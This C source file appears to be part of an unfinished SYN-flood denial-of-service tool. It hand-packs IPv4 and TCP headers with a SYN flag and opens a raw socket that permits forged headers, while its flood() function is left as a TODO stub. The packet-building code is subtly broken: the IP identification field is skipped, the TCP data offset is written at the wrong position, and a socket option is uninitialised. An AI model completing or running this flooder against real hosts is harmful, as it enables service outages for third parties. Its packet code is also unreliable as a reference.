#include "dos_syn.h"

static Buffer buf;

static void copy_ip_version_ihl(Buffer *buf, Payload *payload) {
    char tmp_src_buf[1] = {((payload->ip->version) << 4) | (payload->ip->ihl)};
    char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    return;
}

static void copy_ip_tos(Buffer *buf, Payload *payload) {
    char tmp_src_buf[1] = {payload->ip->tos};
    char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    return;
}

static void copy_ip_total_length(Buffer *buf, Payload *payload) {
    char tmp_src_buf[2] = {
        ((payload->ip->total_length) >> 8),
        ((payload->ip->total_length) & 0xff)
    };
    char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    (buf->index)++;
    return;
}

static void copy_ip_identification(Buffer *buf, Payload *payload) {
    char tmp_src_buf[2] = {
        ((payload->ip->identification) >> 8),
        ((payload->ip->identification) & 0xff)
    };
    char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    (buf->index)++;
    return;
}

static void copy_ip_flags_fragment_offset(Buffer *buf, Payload *payload) {
    char tmp_src_buf[2] = {
        ((payload->ip->flags) << 5) | ((payload->ip->fragment_offset) >> 8),
        ((payload->ip->flags) & 0xff)
    };
    char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    (buf->index)++;
    return;
}

static void copy_ip_ttl(Buffer *buf, Payload *payload) {
    char tmp_src_buf[1] = {payload->ip->ttl};
    char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    return;
}

static void copy_ip_protocol(Buffer *buf, Payload *payload) {
    char tmp_src_buf[1] = {payload->ip->protocol};
    char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    return;
}

static void copy_ip_checksum(Buffer *buf, Payload *payload) {
    char tmp_src_buf[2] = {
        ((payload->ip->checksum) >> 8),
        ((payload->ip->checksum) & 0xff)
    };
    char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    (buf->index)++;
    return;
}

static void copy_tcp_src_port(Buffer *buf, Payload *payload) {
    char tmp_src_buf[2] = {
        ((payload->tcp->src_port) >> 8),
        ((payload->tcp->src_port) & 0xff),
    };
    char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    (buf->index)++;
    return;
}

static void copy_tcp_dst_port(Buffer *buf, Payload *payload) {
    char tmp_src_buf[2] = {
        ((payload->tcp->dst_port) >> 8),
        ((payload->tcp->dst_port) & 0xff),
    };
    char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    (buf->index)++;
    return;
}

static void copy_tcp_sequence(Buffer *buf, Payload *payload) {
    char tmp_src_buf[4] = {
        ((payload->tcp->sequence) >> 24),
        ((payload->tcp->sequence) >> 16),
        ((payload->tcp->sequence) >> 8),
        ((payload->tcp->sequence) & 0xff),
    };
    char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index) += 4;
    return;
}

static void copy_tcp_acknowledgement(Buffer *buf, Payload *payload) {
    char tmp_src_buf[4] = {
        ((payload->tcp->acknowledgement) >> 24),
        ((payload->tcp->acknowledgement) >> 16),
        ((payload->tcp->acknowledgement) >> 8),
        ((payload->tcp->acknowledgement) & 0xff),
    };
    char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index) += 4;
    return;
}

static void copy_tcp_data_offset(Buffer *buf, Payload *payload) {
    char tmp_src_buf[1] = {((payload->tcp->data_offset) << 4)};
    char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf ), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    return;
}

static void copy_tcp_flags(Buffer *buf, Payload *payload) {
    char tmp_src_buf[1] = {
        ((payload->tcp->cwr) << 7) |
        ((payload->tcp->ece) << 6) |
        ((payload->tcp->urg) << 5) |
        ((payload->tcp->ack) << 4) |
        ((payload->tcp->psh) << 3) |
        ((payload->tcp->rst) << 2) |
        ((payload->tcp->syn) << 1) |
        ((payload->tcp->fin) << 0)
    };
    char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    return;
}

static void copy_tcp_window(Buffer *buf, Payload *payload) {
    char tmp_src_buf[2] = {
        ((payload->tcp->window) >> 8),
        ((payload->tcp->window) & 0xff),
    };
    char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    (buf->index)++;
    return;
}

static void copy_tcp_checksum(Buffer *buf, Payload *payload) {
    char tmp_src_buf[2] = {
        ((payload->tcp->checksum) >> 8),
        ((payload->tcp->checksum) & 0xff),
    };
    char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    (buf->index)++;
    return;
}

static void copy_tcp_urgent_pointer(Buffer *buf, Payload *payload) {
    char tmp_src_buf[2] = {0, 0};
    char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    (buf->index)++;
    return;
}

static int checksum(unsigned char *buf, size_t buf_len) {
    unsigned long value = 0;
    unsigned long word = 0;
    size_t i;
    for (i = 0; i < buf_len; i += 2) {
        word = (buf[i] << 8) + (i + 1 < buf_len ? buf[i + 1] : 0);
        value += word;
    }
    value = (value >> 16) + (value & 0xffff);
    value = (~value & 0xffff);
    return (int) value;
}

unsigned int init_socket(void) {
    unsigned int sockfd;
    unsigned short optval;
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &optval, (socklen_t) sizeof (optval));
    return sockfd;
}

void pack_ipv4_header(Buffer *buf, Payload *payload) {
    copy_ip_version_ihl(buf, payload);
    copy_ip_tos(buf, payload);
    copy_ip_total_length(buf, payload);
    copy_ip_flags_fragment_offset(buf, payload);
    copy_ip_ttl(buf, payload);
    copy_ip_protocol(buf, payload);
    copy_ip_checksum(buf, payload);
    memcpy((buf->buffer) + (buf->index), payload->ip->src_addr, sizeof (payload->ip->src_addr));
    (buf->index) += 4;
    memcpy((buf->buffer) + (buf->index), payload->ip->dst_addr, sizeof (payload->ip->dst_addr));
    (buf->index) += 4;
    return;
}

void pack_tcp_header(Buffer *buf, Payload *payload) {
    copy_tcp_src_port(buf, payload);
    copy_tcp_dst_port(buf, payload);
    copy_tcp_sequence(buf, payload);
    copy_tcp_acknowledgement(buf, payload);
    copy_tcp_data_offset(buf, payload);
    copy_tcp_flags(buf, payload);
    copy_tcp_window(buf, payload);
    copy_tcp_checksum(buf, payload);
    copy_tcp_urgent_pointer(buf, payload);
    return;
}

size_t flood(DoS_SYN_args *args) {
    /* TODO */
    buf.buffer = malloc(PAYLOAD_SIZE * sizeof(char));
    buf.index = 0;
    return 0;
}
